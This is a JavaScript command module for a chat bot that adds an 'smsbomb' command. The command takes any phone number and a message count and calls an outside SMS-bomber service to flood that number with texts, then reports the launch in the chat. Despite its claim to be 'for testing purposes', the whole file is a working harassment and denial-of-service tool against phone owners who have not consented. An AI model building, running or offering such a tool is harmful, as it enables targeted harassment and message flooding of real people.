const axios = require('axios');

module.exports.config = {
  name: "smsbomb",
  version: 1.0,
  credits: "Developer",
  description: "Send multiple SMS to a specific phone number for testing purposes.",
  hasPrefix: false,
  usages: "{pn} [phone] [times]",
  aliases: [],
  cooldown: 10,
};

module.exports.run = async function ({ api, event, args }) {
  const phone = args[0];
  const times = parseInt(args[1]);

  if (!phone || !times || isNaN(times) || times <= 0) {
    await api.sendMessage(
      "Invalid usage. Please provide a valid phone number and the number of messages to send.\nExample: smsbomb 1234567890 5",
      event.threadID
    );
    return;
  }

  const apiUrl = `https://haji-mix.gleeze.com/smsbomber?phone=${encodeURIComponent(phone)}&times=${times}`;

  try {
    const response = await axios.get(apiUrl);

    if (response.data.status === "success") {
      await api.sendMessage(
        `SMS Bomber initiated!\nPhone Number: ${phone}\nMessages Sent: ${times}\nStatus: ${response.data.message}`,
        event.threadID
      );
    } else {
      throw new Error(response.data.message || "Failed to initiate SMS Bomber.");
    }
  } catch (error) {
    await api.sendMessage(
      `An error occurred while processing your request:\n${error.message}`,
      event.threadID
    );
  }
};